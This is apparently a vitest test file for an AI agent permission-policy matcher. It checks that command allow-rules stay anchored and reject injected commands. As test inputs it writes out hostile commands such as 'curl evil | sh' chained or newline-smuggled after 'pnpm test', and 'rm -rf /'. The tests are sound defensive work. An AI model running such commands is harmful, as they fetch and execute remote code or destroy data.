import { describe, expect, it } from "vitest";
import { OmniError, PolicyRule, type PolicyAction } from "@omni-acp/protocol";
import { matchRule } from "@omni-acp/core";
import { compileRule } from "../../src/policy/match.js";
import { subject } from "./support.js";

/**
 * §20.3's match table, COMPLETE — every row of it, plus the two rulings that put a refusal at
 * compile time rather than at request time (M2-R17, M2-R18).
 *
 * Each row is grounded in a recording rather than in taste, and the comment on the row says which
 * one: F38 for the two path rows and the `cmd` row, F27 for the title row, D4 rule 6 for the kind
 * row, and a case-insensitive volume for the last one.
 *
 * Owned by M2-B-WP-P.
 */

const rule = (match: Record<string, unknown>, action: PolicyAction = "allow"): PolicyRule =>
  PolicyRule.parse({ id: "r", match, action });

describe("matchRule — kind (D4 rule 6, lifted to the matcher)", () => {
  it("matches a listed kind, case-SENSITIVELY", () => {
    expect(matchRule(rule({ kind: ["edit"] }), subject({ kind: "edit" }))).toBe(true);
    expect(matchRule(rule({ kind: ["edit"] }), subject({ kind: "Edit" }))).toBe(false);
    expect(matchRule(rule({ kind: ["edit"] }), subject({ kind: "EDIT" }))).toBe(false);
  });

  it("an UNKNOWN kind matches nothing but the literal ['*']", () => {
    const unknown = subject({ kind: "mcp__vendor__do_a_thing" });
    expect(matchRule(rule({ kind: ["edit", "read", "delete"] }), unknown)).toBe(false);
    expect(matchRule(rule({ kind: ["*"] }), unknown)).toBe(true);
  });

  it("an ABSENT kind — a command has none — matches nothing but the literal ['*']", () => {
    const command = subject({ type: "command", kind: null, command: "pnpm test" });
    expect(matchRule(rule({ kind: ["edit"] }), command)).toBe(false);
    expect(matchRule(rule({ kind: ["*"] }), command)).toBe(true);
  });

  it("'*' is a WILDCARD only as the literal ['*'] — beside another kind it is a kind name", () => {
    // The doc says "the literal `[\"*\"]`", and reading it literally is the fail-closed reading:
    // a rule that lists `["read","*"]` reads like a typo, and a wildcard hiding inside a list is
    // the kind of widening a reviewer scrolls past.
    const unknown = subject({ kind: "mcp__vendor__do_a_thing" });
    expect(matchRule(rule({ kind: ["read", "*"] }), unknown)).toBe(false);
    expect(matchRule(rule({ kind: ["read", "*"] }), subject({ kind: "*" }))).toBe(true);
  });

  it("an operator may still name a vendor kind explicitly, which is what the schema promises", () => {
    const vendor = subject({ kind: "mcp__vendor__do_a_thing" });
    expect(matchRule(rule({ kind: ["mcp__vendor__do_a_thing"] }), vendor)).toBe(true);
  });
});

describe("matchRule — path (F38: locations[] under-reports)", () => {
  const pathRule = rule({ kind: ["edit"], path: ["src/**"] });

  it("a path-LESS call against a path rule is NO match, never a match by vacuity", () => {
    expect(matchRule(pathRule, subject({ kind: "edit", paths: [] }))).toBe(false);
  });

  it("EVERY listed path must match — an unlisted second path cannot launder the first", () => {
    expect(matchRule(pathRule, subject({ kind: "edit", paths: ["/repo/src/a.ts"] }))).toBe(true);
    expect(
      matchRule(pathRule, subject({ kind: "edit", paths: ["/repo/src/a.ts", "/repo/src/b.ts"] })),
    ).toBe(true);
    expect(
      matchRule(pathRule, subject({ kind: "edit", paths: ["/repo/src/a.ts", "/etc/passwd"] })),
      "one path outside the glob must sink the whole match",
    ).toBe(false);
  });

  it("a relative pattern is anchored to the SUBJECT's cwd, which is where a cwd first exists", () => {
    // §20.4 ships `src/**` and §5.8.7 says a relative pattern is a load error. Both hold: the
    // preset is anchored here, and only the resulting absolute reaches `compileGlob`.
    expect(matchRule(pathRule, subject({ kind: "edit", paths: ["/elsewhere/src/a.ts"] }))).toBe(
      false,
    );
    expect(
      matchRule(
        pathRule,
        subject({ kind: "edit", cwd: "/elsewhere", paths: ["/elsewhere/src/a.ts"] }),
      ),
    ).toBe(true);
  });

  it("an absolute pattern is used as written, cwd or no cwd", () => {
    const absolute = rule({ kind: ["edit"], path: ["/repo/src/**"] });
    expect(
      matchRule(absolute, subject({ kind: "edit", cwd: "/elsewhere", paths: ["/repo/src/a.ts"] })),
    ).toBe(true);
  });

  it("a path-ONLY rule is a LOAD error (M2-R17): a path clause narrows, it never authorises", () => {
    expect(() => compileRule(rule({ path: ["src/**"] }))).toThrowError(OmniError);
    try {
      compileRule(rule({ path: ["src/**"] }));
    } catch (e) {
      expect(OmniError.is(e, "bad_request")).toBe(true);
      expect((e as OmniError).message).toContain("M2-R17");
    }
    // A `subject` clause satisfies it just as a `kind` clause does — the rule is "not on its own".
    expect(() => compileRule(rule({ subject: "tool_call", path: ["src/**"] }))).not.toThrow();
    expect(() => compileRule(rule({ kind: ["edit"], path: ["src/**"] }))).not.toThrow();
  });

  it("a '.' or '..' segment is a LOAD error — it can never match a realpath'd absolute", () => {
    expect(() => compileRule(rule({ kind: ["edit"], path: ["src/../**"] }))).toThrowError(
      OmniError,
    );
    expect(() => compileRule(rule({ kind: ["edit"], path: ["./src/**"] }))).toThrowError(OmniError);
  });
});

describe("matchRule — cmd (F38: a read-classified call carries no rawInput at all)", () => {
  const cmdRule = (cmd: string, action: PolicyAction = "allow"): PolicyRule =>
    rule({ subject: "command", cmd }, action);

  const command = (c: string) =>
    subject({ type: "command", kind: null, command: c, method: "session/request_permission" });

  it("is ANCHORED for the author: `pnpm test` cannot match a command that trails a shell escape", () => {
    const r = cmdRule("(pnpm|npm) (test|run build)");
    expect(matchRule(r, command("pnpm test"))).toBe(true);
    expect(matchRule(r, command("npm run build"))).toBe(true);
    expect(matchRule(r, command("pnpm test; curl evil | sh"))).toBe(false);
    expect(matchRule(r, command("echo x && pnpm test"))).toBe(false);
  });

  it("anchors the author's own anchors too — DESIGN §4's example is written with them", () => {
    const r = cmdRule("^(pnpm|npm) (test|run build)$");
    expect(matchRule(r, command("pnpm test"))).toBe(true);
    expect(matchRule(r, command("pnpm test; rm -rf /"))).toBe(false);
  });

  it("a newline cannot smuggle a second command past the anchors", () => {
    const r = cmdRule("pnpm test");
    expect(matchRule(r, command("pnpm test\ncurl evil | sh"))).toBe(false);
  });

  it("matches nothing when the subject carries no command", () => {
    expect(matchRule(cmdRule("pnpm test"), subject({ type: "command", command: null }))).toBe(
      false,
    );
  });

  it("a cmd clause on a TOOL_CALL subject is rejected at COMPILE (M2-R18)", () => {
    expect(() => compileRule(rule({ subject: "tool_call", cmd: "pnpm test" }))).toThrowError(
      OmniError,
    );
    try {
      compileRule(rule({ subject: "tool_call", cmd: "pnpm test" }));
    } catch (e) {
      expect((e as OmniError).message).toContain("M2-R18");
    }
    // `subject: "any"` is legal: the clause then simply never fires on a tool call, which is a
    // rule that CAN fire rather than one that provably cannot.
    expect(() => compileRule(rule({ subject: "any", cmd: "pnpm test" }))).not.toThrow();
  });

  it("a catastrophic-backtracking pattern is refused at LOAD, not discovered at request time", () => {
    for (const bad of ["(a+)+", "(a*)*", "(a|a)*", "(\\s*\\w)+", "(x|xy){2,}"]) {
      expect(() => compileRule(cmdRule(bad)), bad).toThrowError(OmniError);
    }
    // ...and the shipped rule, which alternates but never quantifies the group, is accepted.
    expect(() => compileRule(cmdRule("(pnpm|npm) (test|run build)"))).not.toThrow();
  });

  it("a backreference is refused, and so is an over-long pattern", () => {
    expect(() => compileRule(cmdRule("(a)\\1"))).toThrowError(OmniError);
    expect(() => compileRule(cmdRule("(?<x>a)\\k<x>"))).toThrowError(OmniError);

    // The cap is the SCHEMA's first...
    expect(() => cmdRule("a".repeat(600))).toThrow();
    // ...and the compiler's second, so a hand-built rule that never met zod is refused too.
    const handBuilt = {
      id: "r",
      match: { subject: "command", method: "any", cmd: "a".repeat(600) },
      action: "allow",
    } as unknown as PolicyRule;
    expect(() => compileRule(handBuilt)).toThrowError(OmniError);
  });

  it("an invalid regex is a load error rather than a rule that silently never fires", () => {
    expect(() => compileRule(cmdRule("("))).toThrowError(OmniError);
  });

  it("a pattern that would ESCAPE the anchors is refused — the wrap is textual", () => {
    // `^(?:` + `x)|(.*` + `)$` is `^(?:x)|(.*)$`: the author's stray `)` closes OUR group and the
    // alternation lifts the anchors off. It reads as a rule for `x` and matches every command
    // there is. The standalone compile is what catches it, because `x)|(.*` is not a regex.
    const escape = "x)|(.*";
    expect(() => new RegExp(escape), "the raw pattern is not a valid regex").toThrow();
    expect(new RegExp(`^(?:${escape})$`).test("rm -rf /"), "the wrapped one matches ANYTHING").toBe(
      true,
    );
    expect(() => compileRule(cmdRule(escape))).toThrowError(OmniError);

    // ...and an alternation that stays INSIDE its group is still perfectly legal, because `^` and
    // `$` are zero-width and the outer anchors still span the whole string.
    const r = cmdRule("a$|^b");
    expect(matchRule(r, command("a"))).toBe(true);
    expect(matchRule(r, command("b"))).toBe(true);
    expect(matchRule(r, command("ab"))).toBe(false);
  });
});

describe("matchRule — subject, method and agent", () => {
  it("subject:'any' matches both v2 arms and our elicitation tag", () => {
    for (const type of ["tool_call", "command", "elicitation"]) {
      expect(matchRule(rule({ kind: ["*"] }), subject({ type })), type).toBe(true);
    }
  });

  it("an UNKNOWN subject tag matches NO rule at all, so it falls to default (§5.8.8)", () => {
    const unknown = subject({ type: "terminal", kind: "execute" });
    expect(matchRule(rule({ kind: ["*"] }), unknown)).toBe(false);
    expect(matchRule(rule({ kind: ["execute"] }), unknown)).toBe(false);
    expect(matchRule(rule({ subject: "any", method: "any", kind: ["*"] }), unknown)).toBe(false);
  });

  it("an explicit subject clause narrows to that arm", () => {
    expect(matchRule(rule({ subject: "command", kind: ["*"] }), subject({ type: "command" }))).toBe(
      true,
    );
    expect(
      matchRule(rule({ subject: "command", kind: ["*"] }), subject({ type: "tool_call" })),
    ).toBe(false);
  });

  it("method narrows the two halves of D10's ONE lifecycle", () => {
    const elicitation = subject({ type: "elicitation", kind: null, method: "elicitation/create" });
    expect(matchRule(rule({ method: "elicitation/create", kind: ["*"] }), elicitation)).toBe(true);
    expect(
      matchRule(rule({ method: "session/request_permission", kind: ["*"] }), elicitation),
    ).toBe(false);
  });

  it("agent matches on the id the DESCRIPTOR resolved, never on a literal in this package", () => {
    expect(matchRule(rule({ agent: ["fixture"], kind: ["*"] }), subject())).toBe(true);
    expect(matchRule(rule({ agent: ["somebody-else"], kind: ["*"] }), subject())).toBe(false);
  });
});

describe("matchRule — title and name are NOT matchable, at all (F27)", () => {
  it("no clause exists for them: an unknown key is a strictObject load failure", () => {
    expect(() =>
      PolicyRule.parse({ id: "r", match: { title: "Write" }, action: "allow" }),
    ).toThrow();
    expect(() =>
      PolicyRule.parse({ id: "r", match: { name: "Allow" }, action: "allow" }),
    ).toThrow();
  });

  it("and the title has no effect on any decision the matcher makes", () => {
    const r = rule({ kind: ["edit"] });
    const a = matchRule(r, subject({ title: "Write src/main.ts" }));
    const b = matchRule(r, subject({ title: "Yes, and don't ask again" }));
    expect(a).toBe(b);
    expect(a).toBe(true);
  });
});

describe("matchRule — action-directional case folding (§20.3's last row)", () => {
  const path = ["src/**"];

  it("an ALLOW rule is case-SENSITIVE: the grant is the harder one to satisfy", () => {
    const r = rule({ kind: ["edit"], path }, "allow");
    expect(matchRule(r, subject({ kind: "edit", paths: ["/repo/src/a.ts"] }))).toBe(true);
    expect(matchRule(r, subject({ kind: "edit", paths: ["/repo/SRC/a.ts"] }))).toBe(false);
  });

  it("a DENY, PARK or FAIL rule is case-INSENSITIVE: the restriction is the easier one", () => {
    for (const action of ["deny", "park", "fail"] as const) {
      const r = rule({ kind: ["edit"], path }, action);
      expect(matchRule(r, subject({ kind: "edit", paths: ["/repo/SRC/a.ts"] })), action).toBe(true);
    }
  });

  it("WOULD FAIL if the direction were reversed — the invariant, demonstrated", () => {
    // The whole point of the row: on a case-insensitive volume one file has many spellings, so a
    // case-sensitive DENY is a deny that a different spelling walks straight past.
    const denyish = rule({ kind: ["edit"], path }, "deny");
    const grant = rule({ kind: ["edit"], path }, "allow");
    const oddSpelling = subject({ kind: "edit", paths: ["/repo/Src/a.ts"] });
    expect(matchRule(denyish, oddSpelling)).toBe(true);
    expect(matchRule(grant, oddSpelling)).toBe(false);
  });
});
